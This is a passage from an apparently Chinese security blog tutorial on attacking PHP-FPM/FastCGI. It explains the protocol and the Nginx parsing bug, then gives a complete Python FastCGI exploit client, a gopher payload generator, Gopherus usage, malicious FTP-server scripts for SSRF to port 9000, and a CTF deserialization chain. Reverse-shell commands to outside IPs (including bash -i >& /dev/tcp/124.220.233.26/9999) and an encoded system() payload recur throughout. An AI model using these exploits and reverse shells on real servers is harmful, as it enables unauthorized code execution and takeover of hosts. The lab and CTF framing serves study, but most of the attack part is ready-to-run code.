requestIdB0; unsigned char contentLengthB1; // body体的大小 unsigned char contentLengthB0; unsigned char paddingLength; // 额外块大小 unsigned char reserved; /* Body */ unsigned char contentData[contentLength]; unsigned char paddingData[paddingLength]; } FCGI_Record; 头由8个uchar类型的变量组成，每个变量1字节。其中，requestId占两个字节，一个唯一的标志id，以避免多个请求之间的影响；contentLength占两个字节，表示body的大小。 语言端解析了fastcgi头以后，拿到contentLength，然后再在TCP流里读取大小等于contentLength的数据，这就是body体。 Body后面还有一段额外的数据（Padding），其长度由头中的paddingLength指定，起保留作用。不需要该Padding的时候，将其长度设置为0即可。 可见，一个fastcgi record结构最大支持的body大小是2^16，也就是65536字节。 FastCGI Type type就是指定该record的作用。因为fastcgi一个record的大小是有限的，作用也是单一的，所以我们需要在一个TCP流里传输多个record。通过type来标志每个record的作用，用requestId作为同一次请求的id。 也就是说，每次请求，会有多个record，他们的requestId是相同的。 借用该文章中的一个表格，列出最主要的几种type： 看了这个表格就很清楚了，服务器中间件和后端语言通信，第一个数据包就是type为1的record，后续互相交流，发送type为4、5、6、7的record，结束时发送type为2、3的record。 当后端语言接收到一个type为4的record后，就会把这个record的body按照对应的结构解析成key-value对，这就是环境变量。 0x03 PHP-FPM 官方对它的解释是FPM（FastCGI 进程管理器）用于替换 PHP FastCGI 的大部分附加功能，对于高负载网站是非常有用的。 也就是说php-fpm是FastCGI的一个具体实现，并且提供了进程管理的功能，在其中的进程中，包含了master和worker进程，这个在后面我们进行环境搭建的时候可以通过命令查看。其中master 进程负责与 Web 服务器进行通信，接收 HTTP 请求，再将请求转发给 worker 进程进行处理，**worker 进程主要负责动态执行 PHP 代码，**处理完成后，将处理结果返回给 Web 服务器，再由 Web 服务器将结果发送给客户端。 那实际上呢FPM其实是一个fastcgi协议解析器，Nginx等服务器中间件将用户请求按照fastcgi的规则打包好通过TCP传给谁？其实就是传给FPM。 FPM按照fastcgi的协议将TCP流解析成真正的数据。 举个例子，用户访问http://127.0.0.1/index.php?a=1&amp;b=2，如果web目录是/var/www/html，那么Nginx会将这个请求变成如下key-value对： { 'GATEWAY_INTERFACE': 'FastCGI/1.0', 'REQUEST_METHOD': 'GET', 'SCRIPT_FILENAME': '/var/www/html/index.php', 'SCRIPT_NAME': '/index.php', 'QUERY_STRING': '?a=1&amp;b=2', 'REQUEST_URI': '/index.php?a=1&amp;b=2', 'DOCUMENT_ROOT': '/var/www/html', 'SERVER_SOFTWARE': 'php/fcgiclient', 'REMOTE_ADDR': '127.0.0.1', 'REMOTE_PORT': '12345', 'SERVER_ADDR': '127.0.0.1', 'SERVER_PORT': '80', 'SERVER_NAME': \"localhost\", 'SERVER_PROTOCOL': 'HTTP/1.1' } 这个数组其实就是PHP中$_SERVER数组的一部分，也就是PHP里的环境变量。但环境变量的作用不仅是填充$_SERVER数组，也是告诉fpm：“我要执行哪个PHP文件”。 PHP-FPM拿到fastcgi的数据包后，进行解析，得到上述这些环境变量。然后，执行SCRIPT_FILENAME的值指向的PHP文件，也就是/var/www/html/index.php。 Nginx（IIS7）解析漏洞 Nginx和IIS7曾经出现过一个PHP相关的解析漏洞（测试环境https://github.com/phith0n/vulhub/tree/master/nginx_parsing_vulnerability），该漏洞现象是，在用户访问http://127.0.0.1/favicon.ico/.php时，访问到的文件是favicon.ico，但却按照.php后缀解析了。 用户请求http://127.0.0.1/favicon.ico/.php，nginx将会发送如下环境变量到fpm里： { ... 'SCRIPT_FILENAME': '/var/www/html/favicon.ico/.php', 'SCRIPT_NAME': '/favicon.ico/.php', 'REQUEST_URI': '/favicon.ico/.php', 'DOCUMENT_ROOT': '/var/www/html', ... } 正常来说，SCRIPT_FILENAME的值是一个不存在的文件/var/www/html/favicon.ico/.php，是PHP设置中的一个选项fix_pathinfo导致了这个漏洞。PHP为了支持Path Info模式而创造了fix_pathinfo，在这个选项被打开的情况下，fpm会判断SCRIPT_FILENAME是否存在，如果不存在则去掉最后一个/及以后的所有内容，再次判断文件是否存在，往次循环，直到文件存在。 所以，第一次fpm发现/var/www/html/favicon.ico/.php不存在，则去掉/.php，再判断/var/www/html/favicon.ico是否存在。显然这个文件是存在的，于是被作为PHP文件执行，导致解析漏洞。 正确的解决方法有两种，一是在Nginx端使用fastcgi_split_path_info将path info信息去除后，用tryfiles判断文件是否存在；二是借助PHP-FPM的security.limit_extensions配置项，避免其他后缀文件被解析。 security.limit_extensions配置 写到这里，PHP-FPM未授权访问漏洞也就呼之欲出了。PHP-FPM默认监听9000端口，如果这个端口暴露在公网，则我们可以自己构造fastcgi协议，和fpm进行通信。 此时，SCRIPT_FILENAME的值就格外重要了。因为fpm是根据这个值来执行php文件的，如果这个文件不存在，fpm会直接返回404： 在fpm某个版本之前，我们可以将SCRIPT_FILENAME的值指定为任意后缀文件，比如/etc/passwd；但后来，fpm的默认配置中增加了一个选项security.limit_extensions： ; Limits the extensions of the main script FPM will allow to parse. This can ; prevent configuration mistakes on the web server side. You should only limit ; FPM to .php extensions to prevent malicious users to use other extensions to ; exectute php code. ; Note: set an empty value to allow all extensions. ; Default Value: .php ;security.limit_extensions = .php .php3 .php4 .php5 .php7 其限定了只有某些后缀的文件允许被fpm执行，默认是.php。所以，当我们再传入/etc/passwd的时候，将会返回Access denied.： 由于这个配置项的限制，如果想利用PHP-FPM的未授权访问漏洞，首先就得找到一个已存在的PHP文件。 万幸的是，通常使用源安装php的时候，服务器上都会附带一些php后缀的文件，我们使用find / -name \"*.php\"来全局搜索一下默认环境： 找到了不少。这就给我们提供了一条思路，假设我们爆破不出来目标环境的web目录，我们可以找找默认源安装后可能存在的php文件，比如/usr/local/lib/php/PEAR.php。 任意代码执行 那在上述条件下我们即使SCRIPT_FILENAME可控，但由于其对于文件后缀的限制以及如果起服务器上没有相应的文件，则其会无法执行文件而返回404的特性，就不能执行我们想要其执行的恶意文件了，只能执行其服务器上存在的文件。 那我们如何才能让其执行恶意文件呢，这就需要以下两个配置项：auto_prepend_file和auto_append_file。 auto_append_file #在执行php文件后自动包含一个指定文件 auto_prepend_file #在执行php文件前自动包含一个指定文件 我们锁定第二个参数，如果我们将其设置为php://input，那就等于在执行指定php文件之前先执行一次input指定的post的内容，因此我们将恶意代码放入body中即可让其执行我们的恶意代码（当然，还需要开启远程文件包含选项allow_url_include） 那么，我们怎么设置auto_prepend_file的值？ 这又涉及到PHP-FPM的两个环境变量，PHP_VALUE和PHP_ADMIN_VALUE。这两个环境变量就是用来设置PHP配置项的，PHP_VALUE可以设置模式为PHP_INI_USER和PHP_INI_ALL的选项，PHP_ADMIN_VALUE可以设置所有选项。（disable_functions除外，这个选项是PHP加载的时候就确定了，在范围内的函数不会直接被加载到PHP上下文中） 所以，我们最后传入如下环境变量： { 'GATEWAY_INTERFACE': 'FastCGI/1.0', 'REQUEST_METHOD': 'GET', 'SCRIPT_FILENAME': '/var/www/html/index.php', 'SCRIPT_NAME': '/index.php', 'QUERY_STRING': '?a=1&amp;b=2', 'REQUEST_URI': '/index.php?a=1&amp;b=2', 'DOCUMENT_ROOT': '/var/www/html', 'SERVER_SOFTWARE': 'php/fcgiclient', 'REMOTE_ADDR': '127.0.0.1', 'REMOTE_PORT': '12345', 'SERVER_ADDR': '127.0.0.1', 'SERVER_PORT': '80', 'SERVER_NAME': \"localhost\", 'SERVER_PROTOCOL': 'HTTP/1.1' 'PHP_VALUE': 'auto_prepend_file = php://input', 'PHP_ADMIN_VALUE': 'allow_url_include = On' } 设置auto_prepend_file = php://input且allow_url_include = On，然后将我们需要执行的代码放在Body中，即可执行任意代码。 0x03 环境搭建 有了上面对于这个漏洞的理解，我们接下来搭建一下环境来复现一波，文章参考：SSRF系列之攻击FastCGI 靶 机: Ubuntu 攻击机: Kali 这里直接在Ubuntu上安装Nginx和php-fpm，首先安装Nginx sudo apt-get install nginx 安装php、php-fpm以及一些插件 sudo apt-get install software-properties-common python-software-properties sudo add-apt-repository ppa:ondrej/php #这里容易卡死,解决方法使用代理 sudo apt-get update sudo apt-get -y install php7.2 sudo -y apt-get install php7.2-fpm php7.2-mysql php7.2-curl php7.2-json php7.2-mbstring php7.2 上面这五条命令，如果前面两个出错，应该是不用在乎的（亲身经历） 配置php-fpm 这里花了一天的时间才成功配置好。。。。 修改配置监听9000端口来处理nginx的请求 打开/etc/php/7.2/fpm/pool.d/www.conf文件找到如下位置注释第一行添加第二行 ;listen = /run/php/php7.2-fpm.sock listen = 127.0.0.1:9000 注意这里如果设置监听为0.0.0.0:9000就在产生php-fpm未授权访问漏洞，此时攻击者可以直接与9000端口上的php-fpm进行通信，进而可以实现任意代码执行。 下面修改权限 chmod 777 /run/php/php7.2-fpm.sock 打开nginx的配置文件 /etc/nginx/sites-available/default 修改相应部分的配置 这里在位置1，修改一下nginx的根目录位置，最好别搞/var/www/html，这样似乎是与ubuntu自带的Apache2服务冲突（如果没有apache2当我没说），随后在位置2添加index.php，位置3中server_name 赋值为localhost。最后在其下面合适位置添加如下代码即可 location ~\\.php$ { try_files $uri = 404; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; include fastcgi_params; } 保存文件，使配置文件生效 启动环境 这里先启动nginx服务，完成后查看一下php-fpm的安装位置，然后启动：service php7.2-fpm start whereis php-fpm /usr/sbin/php-fpm7.2 #这是我的靶机上php-fpm安装的位置 重新启动Nginx sudo systemctl restart nginx 然后检查nginx是否正确启动 systemctl status nginx 检查php-fpm是否正确启动 ps -elf | grep php-fpm 这里就可以看出上面所说的存在一个master进程和多个worker进程 下面将/usr/share/nginx/html目录下的文件删除，新建一个index.php，内容可以写上&lt;?php phpinfo();?&gt; 用来检查各项是否正常运行，如果页面为空，查看这篇文章解决 其中Sever API 处和上图一样说明运行正确，然后在目录下新建ssrf.php 内容为 &lt;?php highlight_file(__FILE__); $url = $_GET['url']; $curl = curl_init($url); //第二种初始化curl的方式 //$curl = curl_init(); curl_setopt($curl, CURLOPT_URL, $_GET['url']); /*进行curl配置*/ curl_setopt($curl, CURLOPT_HEADER, 0); // 不输出HTTP头 $responseText = curl_exec($curl); //var_dump(curl_error($curl) );//如果执行curl过程中出现异常，可打开此开关，以便查看异常内容 echo $responseText; curl_close($curl); ?&gt; 该代码为一个ssrf漏洞的示例代码，可以访问/ssrf.php?url=http://www.baidu.com进行测试，下图为正常的结果 ssrf攻击FastCGI演示 使用exp攻击 这里在已知其使用了php-fpm的情况下，我们可以先使用exp测试是否可以直接攻击9000端口，这个工具主要是用来攻击未授权访问php-fpm的，所以一些地方需要自己写脚本转换一下payload，下面是使用方法（网上有用go语言写的，这里我采用py的），这个代码似乎py2与py3均可执行，不过我这里直接用的py3，未测试py2 项目地址：https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75 import socket import random import argparse import sys from io import BytesIO # Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client PY2 = True if sys.version_info.major == 2 else False def bchr(i): if PY2: return force_bytes(chr(i)) else: return bytes([i]) def bord(c): if isinstance(c, int): return c else: return ord(c) def force_bytes(s): if isinstance(s, bytes): return s else: return s.encode('utf-8', 'strict') def force_text(s): if issubclass(type(s), str): return s if isinstance(s, bytes): s = str(s, 'utf-8', 'strict') else: s = str(s) return s class FastCGIClient: \"\"\"A Fast-CGI Client for Python\"\"\" # private __FCGI_VERSION = 1 __FCGI_ROLE_RESPONDER = 1 __FCGI_ROLE_AUTHORIZER = 2 __FCGI_ROLE_FILTER = 3 __FCGI_TYPE_BEGIN = 1 __FCGI_TYPE_ABORT = 2 __FCGI_TYPE_END = 3 __FCGI_TYPE_PARAMS = 4 __FCGI_TYPE_STDIN = 5 __FCGI_TYPE_STDOUT = 6 __FCGI_TYPE_STDERR = 7 __FCGI_TYPE_DATA = 8 __FCGI_TYPE_GETVALUES = 9 __FCGI_TYPE_GETVALUES_RESULT = 10 __FCGI_TYPE_UNKOWNTYPE = 11 __FCGI_HEADER_SIZE = 8 # request state FCGI_STATE_SEND = 1 FCGI_STATE_ERROR = 2 FCGI_STATE_SUCCESS = 3 def __init__(self, host, port, timeout, keepalive): self.host = host self.port = port self.timeout = timeout if keepalive: self.keepalive = 1 else: self.keepalive = 0 self.sock = None self.requests = dict() def __connect(self): self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) self.sock.settimeout(self.timeout) self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # if self.keepalive: # self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1) # else: # self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0) try: self.sock.connect((self.host, int(self.port))) except socket.error as msg: self.sock.close() self.sock = None print(repr(msg)) return False return True def __encodeFastCGIRecord(self, fcgi_type, content, requestid): length = len(content) buf = bchr(FastCGIClient.__FCGI_VERSION) \\ + bchr(fcgi_type) \\ + bchr((requestid &gt;&gt; 8) &amp; 0xFF) \\ + bchr(requestid &amp; 0xFF) \\ + bchr((length &gt;&gt; 8) &amp; 0xFF) \\ + bchr(length &amp; 0xFF) \\ + bchr(0) \\ + bchr(0) \\ + content return buf def __encodeNameValueParams(self, name, value): nLen = len(name) vLen = len(value) record = b'' if nLen &lt; 128: record += bchr(nLen) else: record += bchr((nLen &gt;&gt; 24) | 0x80) \\ + bchr((nLen &gt;&gt; 16) &amp; 0xFF) \\ + bchr((nLen &gt;&gt; 8) &amp; 0xFF) \\ + bchr(nLen &amp; 0xFF) if vLen &lt; 128: record += bchr(vLen) else: record += bchr((vLen &gt;&gt; 24) | 0x80) \\ + bchr((vLen &gt;&gt; 16) &amp; 0xFF) \\ + bchr((vLen &gt;&gt; 8) &amp; 0xFF) \\ + bchr(vLen &amp; 0xFF) return record + name + value def __decodeFastCGIHeader(self, stream): header = dict() header['version'] = bord(stream[0]) header['type'] = bord(stream[1]) header['requestId'] = (bord(stream[2]) &lt;&lt; 8) + bord(stream[3]) header['contentLength'] = (bord(stream[4]) &lt;&lt; 8) + bord(stream[5]) header['paddingLength'] = bord(stream[6]) header['reserved'] = bord(stream[7]) return header def __decodeFastCGIRecord(self, buffer): header = buffer.read(int(self.__FCGI_HEADER_SIZE)) if not header: return False else: record = self.__decodeFastCGIHeader(header) record['content'] = b'' if 'contentLength' in record.keys(): contentLength = int(record['contentLength']) record['content'] += buffer.read(contentLength) if 'paddingLength' in record.keys(): skiped = buffer.read(int(record['paddingLength'])) return record def request(self, nameValuePairs={}, post=''): if not self.__connect(): print('connect failure! please check your fasctcgi-server !!') return requestId = random.randint(1, (1 &lt;&lt; 16) - 1) self.requests[requestId] = dict() request = b\"\" beginFCGIRecordContent = bchr(0) \\ + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \\ + bchr(self.keepalive) \\ + bchr(0) * 5 request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN, beginFCGIRecordContent, requestId) paramsRecord = b'' if nameValuePairs: for (name, value) in nameValuePairs.items(): name = force_bytes(name) value = force_bytes(value) paramsRecord += self.__encodeNameValueParams(name, value) if paramsRecord: request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId) request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b'', requestId) if post: request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId) request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b'', requestId) self.sock.send(request) self.requests[requestId]['state'] = FastCGIClient.FCGI_STATE_SEND self.requests[requestId]['response'] = b'' return self.__waitForResponse(requestId) def __waitForResponse(self, requestId): data = b'' while True: buf = self.sock.recv(512) if not len(buf): break data += buf data = BytesIO(data) while True: response = self.__decodeFastCGIRecord(data) if not response: break if response['type'] == FastCGIClient.__FCGI_TYPE_STDOUT \\ or response['type'] == FastCGIClient.__FCGI_TYPE_STDERR: if response['type'] == FastCGIClient.__FCGI_TYPE_STDERR: self.requests['state'] = FastCGIClient.FCGI_STATE_ERROR if requestId == int(response['requestId']): self.requests[requestId]['response'] += response['content'] if response['type'] == FastCGIClient.FCGI_STATE_SUCCESS: self.requests[requestId] return self.requests[requestId]['response'] def __repr__(self): return \"fastcgi connect host:{} port:{}\".format(self.host, self.port) if __name__ == '__main__': parser = argparse.ArgumentParser(description='Php-fpm code execution vulnerability client.') parser.add_argument('host', help='Target host, such as 127.0.0.1') parser.add_argument('file', help='A php file absolute path, such as /usr/local/lib/php/System.php') parser.add_argument('-c', '--code', help='What php code your want to execute', default='&lt;?php phpinfo(); exit; ?&gt;') parser.add_argument('-p', '--port', help='FastCGI port', default=9000, type=int) args = parser.parse_args() client = FastCGIClient(args.host, args.port, 3, 0) params = dict() documentRoot = \"/\" uri = args.file content = args.code params = { 'GATEWAY_INTERFACE': 'FastCGI/1.0', 'REQUEST_METHOD': 'POST', 'SCRIPT_FILENAME': documentRoot + uri.lstrip('/'), 'SCRIPT_NAME': uri, 'QUERY_STRING': '', 'REQUEST_URI': uri, 'DOCUMENT_ROOT': documentRoot, 'SERVER_SOFTWARE': 'php/fcgiclient', 'REMOTE_ADDR': '127.0.0.1', 'REMOTE_PORT': '9985', 'SERVER_ADDR': '127.0.0.1', 'SERVER_PORT': '80', 'SERVER_NAME': \"localhost\", 'SERVER_PROTOCOL': 'HTTP/1.1', 'CONTENT_TYPE': 'application/text', 'CONTENT_LENGTH': \"%d\" % len(content), 'PHP_VALUE': 'auto_prepend_file = php://input',#这里是关键处 'PHP_ADMIN_VALUE': 'allow_url_include = On'# } response = client.request(params, content) 命令格式：python [脚本名] -c [要执行的代码] -p [端口号] [ip] [要执行的php文件] 即：python3 ssrf+FastCGI.py -c \"&lt;?php system('ls');?&gt;\" -p 8888 192.168.246.130 /usr/share/nginx/html/index.php --这里实际是写web目录，但由于我配置的时候不是默认的/var/www/html，因此这里会不一样，当我们在实际遇到的话，一般都是后者。 这里的由于我是用kali监听的端口，故此写了kali的ip与监听端口 接下来我们先运行上述exp，同时在kali开启监听，记录我们的攻击流量 这里的报错不用理会，如下图，这里成功将流量传到了1.txt，接下来将1.txt文件中的内容进行url编码（2次）因为我们这里是利用的ssrf进行的攻击 #-*- coding: UTF-8 -*- import urllib.parse file= open('1.txt','rb') payload= file.read() payload= urllib.parse.quote(payload).replace(\"%0A\",\"%0A%0D\") print(\"gopher://127.0.0.1:9000/_\"+urllib.parse.quote(payload)) 将得到的结果传入到url参数中，如下图成功命令执行 这里看的文章也有一个值得注意的点，就是如果我们得知对方开启了php-fpm，我们可能会直接尝试exp去攻击，但往往会没有效果。这是因为就像我们刚刚的配置过程一般，我们设置的端口监听只允许127.0.0.1，因此如果我们直接进行攻击的话，我们的ip来源是公网的，因此不可能攻击成功。那如何才能可以攻击呢，有两种情况： 对方在进行服务器配置的时候将php-fpm服务的9000端口暴露在了公网，那我们直接就可以进行攻击了。 如果其仅仅监听127.0.0.1，那我们就只能祈福该网站存在ssrf可以让我们利用，这样也可以攻击9000端口 利用 Gopherus 攻击 项目地址：https://github.com/tarunkant/Gopherus Gopherus 这个工具相比上一个更加方便一下，该工具能生成Gopher有效负载，用来利用SSRF进行RCE： 我们浅浅看一下其exp，发现他最终对payload只进行了一次编码，因此我们如果在ssrf上进行攻击的时候，一般要进行2次编码。 下面我们就利用这个工具来执行命令： python2 gopherus.py --exploit fastcgi /var/www/html/index.php # 这里输入的是一个已知存在的php文件 id 我们将得到的结果在进行一次url编码，如下图成功执行 接下来还有很多攻击方法，我们继续学习！ FTP+SSRF 攻击 FPM/FastCGI 这是在之前Laravel Debug mode RCE（CVE-2021-3129）漏洞的一个思路。该漏洞的核心就是传入 file_get_contents() 和 file_put_contents() 这两个函数中的内容没有经过过滤，从而可以通过精巧的构造触发 phar 反序列化，达到RCE的效果。 漏洞代码大致可以简化为如下代码： &lt;?php $contents = file_get_contents($_GET['viewFile']); file_put_contents($_GET['viewFile'], $contents); 这里是将读取传入的viewFile参数指定的文件路径所对应的文件的内容，之后又重新写会那个文件。。。。 由于我们可以运行 file_get_contents() 来查找任何东西，因此，可以运用 SSRF 常用的姿势，通过发送HTTP请求来扫描常用端口。假设此时我们发现目标正在监听 9000 端口，则很有可能目标主机上正在运行着 PHP-FPM，我们可以进一步利用该漏洞来攻击 PHP-FPM。 众所周知，如果我们能向 PHP-FPM 发送一个任意的二进制数据包，就可以在机器上执行代码。这种技术经常与gopher://协议结合使用，curl支持gopher://协议，但file_get_contents却不支持。 但其却支持允许通过TCP发送二进制数据包的FTP协议，更准确的说应该是FTP协议的被动模式： 如果一个客户端试图从FTP服务器上读取或写入一个文件，服务端会通知客户端将文件的内容写入或读取到一个由服务器指定的IP和端口上。而且这里对IP和端口没有进行必要的限制。例如，服务器可以告诉客户端连接到自己的某一个端口上，如果客户端愿意的话。 现在，如果我们尝试使用 viewFile=ftp://evil-server/file.txt 来利用这个漏洞，会发生以下情况： 首先通过 file_get_contents() 函数连接到我们的FTP服务器，并下载file.txt。 然后再通过 file_put_contents() 函数连接到我们的FTP服务器，并将其上传回file.txt。 现在，你可能已经知道这是怎么回事：我们将使用 FTP 协议的被动模式让 file_get_contents() 在我们的服务器上下载一个文件，当它试图使用 file_put_contents() 把它上传回去时，我们将告诉它把文件发送到 127.0.0.1:9000。这样，我们就可以向目标主机本地的 PHP-FPM 发送一个任意的数据包，从而执行代码，造成SSRF了。 这里我还是有点难以理解，接下来我们直接实战来感受一下 首先我们先来生成一下payload，这里采用的命令是bash来反弹shell bash -c \"bash -i &gt;&amp; /dev/tcp/124.220.233.26/9999 0&gt;&amp;1\" 这里我们只需要截取_符号后面的内容 %01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%0D%05%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH107%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%1FSCRIPT_FILENAME/usr/share/nginx/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00k%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.246.130/8888%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00 设置好监听，然后编写如下脚本（脚本是从网上找的），在攻击机上搭建一个恶意的ftp服务，并将上面的payload中的数据替换掉下面ftp脚本中的payload的内容： import socket from urllib.parse import unquote # 对gopherus生成的payload进行一次urldecode payload = unquote(\"%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%0D%05%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH107%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%1FSCRIPT_FILENAME/usr/share/nginx/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00k%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.246.130/8888%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00\") payload = payload.encode('utf-8') host = '0.0.0.0' port = 23 sk = socket.socket() sk.bind((host, port)) sk.listen(5) # ftp被动模式的passvie port,监听到1234 sk2 = socket.socket() sk2.bind((host, 1234)) sk2.listen() # 计数器，用于区分是第几次ftp连接 count = 1 while 1: conn, address = sk.accept() conn.send(b\"200 \") print(conn.recv(20)) # USER aaa\\r 客户端传来用户名 if count == 1: conn.send(b\"220 ready \") else: conn.send(b\"200 ready \") print(conn.recv(20)) # TYPE I\\r 客户端告诉服务端以什么格式传输数据，TYPE I表示二进制， TYPE A表示文本 if count == 1: conn.send(b\"215 \") else: conn.send(b\"200 \") print(conn.recv(20)) # SIZE /123\\r 客户端询问文件/123的大小 if count == 1: conn.send(b\"213 3 \") else: conn.send(b\"300 \") print(conn.recv(20)) # EPSV\\r ' conn.send(b\"200 \") print(conn.recv(20)) # PASV\\r 客户端告诉服务端进入被动连接模式 if count == 1: conn.send(b\"227 192,168,246,130,4,210 \") # 服务端告诉客户端需要到哪个ip:port去获取数据,ip,port都是用逗号隔开，其中端口的计算规则为：4*256+210=1234 else: conn.send(b\"227 127,0,0,1,0,9000 \") # 端口计算规则：35*256+40=9000 print(conn.recv(20)) # 第一次连接会收到命令RETR /123\\r ，第二次连接会收到STOR /123\\r if count == 1: conn.send(b\"125 \") # 告诉客户端可以开始数据连接了 # 新建一个socket给服务端返回我们的payload print(\"建立连接!\") conn2, address2 = sk2.accept() conn2.send(payload) conn2.close() print(\"断开连接!\") else: conn.send(b\"150 \") print(conn.recv(20)) exit() # 第一次连接是下载文件，需要告诉客户端下载已经结束 if count == 1: conn.send(b\"226 \") conn.close() count += 1 运行上述脚本，一个恶意ftp服务就起来了： 这个脚本做的事情很简单，就是当客户端第一次连接的时候返回我们预设的 payload；当客户端第二次连接的时候将客户端的连接重定向到 127.0.0.1:9000，也就是目标主机上 php-fpm 服务的端口，从而造成 SSRF，攻击其 php-fpm。 我认为上述多次连接的过程可以参考：FTP连接过程详解 最后，构造如下请求，触发攻击： /ssrf.php?viewFile=ftp://aaa@192.168.246.130:23/123 这里也是踩了个巨坑，tm直接浪费了我两个小时，问题点在这 conn.send(b\"227 192,168,246,130,4,210 \") # 服务端告诉客户端需要到哪个ip:port去获取数据,ip,port都是用逗号隔开，其中端口的计算规则为：4*256+210=1234 else: conn.send(b\"227 127,0,0,1,0,9000 \") # 端口计算规则：35*256+40=9000 上面代码第一个send发送的ip应该为我们搭建恶意ftp服务器所在的ip，而我当时一直用的127.0.0.1，很显然这是向他自己内部访问1234端口。。。。原来那位师傅搭建的环境都是在自己本机上。。。。犯这种错误真实很滑稽。。。 最后也是成功反弹shell(呜呜~~~~) 假设有以下代码： &lt;?php file_put_contents($_GET['file'], $_GET['data']); 经测试目标主机的 9000 端口上存在 PHP-FPM ，那我们便可以利用与刚才相似的原理，通过搭建恶意的 ftp 服务器来攻击 PHP-FPM。 首先还是使用 gopherus 生成payload，这里就不再赘述了，得到的payload只截取 _ 后面的数据部分。 然后再攻击机上执行以下python脚本搭建一个恶意的 ftp 服务器： import socket s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.bind(('0.0.0.0', 23)) s.listen(1) conn, addr = s.accept() conn.send(b'220 welcome ') #Service ready for new user. #Client send anonymous username #USER anonymous conn.send(b'331 Please specify the password. ') #User name okay, need password. #Client send anonymous password. #PASS anonymous conn.send(b'230 Login successful. ') #User logged in, proceed. Logged out if appropriate. #TYPE I conn.send(b'200 Switching to Binary mode. ') #Size / conn.send(b'550 Could not get the file size. ') #EPSV (1) conn.send(b'150 ok ') #PASV conn.send(b'227 Entering Extended Passive Mode (127,0,0,1,0,9000) ') #STOR / (2) conn.send(b'150 Permission denied. ') #QUIT conn.send(b'221 Goodbye. ') conn.close() 并在 vps 上开启一个 nc 监听，用于接收反弹的shell，最后构造 url 发送 payload 即可： 成功反弹shell 0x04 题目实战 陇原战\"疫\"-eaaasyphp &lt;?php class Check { public static $str1 = false; public static $str2 = false; } class Esle { public function __wakeup() { Check::$str1 = true; } } class Hint { public function __wakeup(){ $this-&gt;hint = \"no hint\"; } public function __destruct(){ if(!$this-&gt;hint){ $this-&gt;hint = \"phpinfo\"; ($this-&gt;hint)(); } } } class Bunny { public function __toString() { if (Check::$str2) { if(!$this-&gt;data){ $this-&gt;data = $_REQUEST['data']; } file_put_contents($this-&gt;filename, $this-&gt;data); } else { throw new Error(\"Error\"); } } } class Welcome { public function __invoke() { Check::$str2 = true; return \"Welcome\" . $this-&gt;username; } } class Bypass { public function __destruct() { if (Check::$str1) { ($this-&gt;str4)(); } else { throw new Error(\"Error\"); } } } if (isset($_GET['code'])) { unserialize($_GET['code']); } else { highlight_file(__FILE__); } 这里浏览一遍会发现，敏感函数似乎是file_put_contents($this-&gt;filename, $this-&gt;data);这里的两个参数都可控，那么接下来就是分析链子了。 不难分析出以下链子：Bypass.__destruct()-&gt;Wecolme.__invoke()-&gt;Bunny.__toString() 但这个Hint函数，需要绕过wakeup，首先看一下php版本信息，如下图为7.2.20，那这里修改属性值为其他整数是无法绕过的，看了几个wp发现修改为负数即可 并且这里事后诸葛亮一下，这里尝试写入文件会发现不成功，那我们就联想到了题目给的hint：phpinfo，那我们看看phpinfo其中有什么信息 O:4:\"Hint\":0:{}-&gt;O:4:\"Hint\":-1:{} 成功之后我们看到其中开启了FastCGI服务，那与我们刚刚学的对上了，而且恰好又有file_put_contents($this-&gt;filename, $this-&gt;data);的存在，这思路很明显了，接下来构造完整pop链子 &lt;?php class Check { public static $str1 = false; public static $str2 = false; } class Esle { public function __wakeup() { Check::$str1 = true; } } class Hint{ } class Bunny { public $data; public $filename; } class Welcome { public $username; } class Bypass { public $str4; public $hybcx; } $pop1 = new Bypass(); $pop1-&gt;str4 = new Welcome(); $pop1-&gt;hybcx = new Esle(); $pop1-&gt;str4-&gt;username = new Bunny(); $pop1-&gt;str4-&gt;username-&gt;filename = 'ftp://aaa@ip:23/123'; echo urlencode(serialize($pop1)); ?&gt; 这里可以确定其/var/www/html/index.php是存在的，直接利用gopherus打 bash -c \"bash -i &gt;&amp; /dev/tcp/ip/8888 0&gt;&amp;1\" 取_后面的 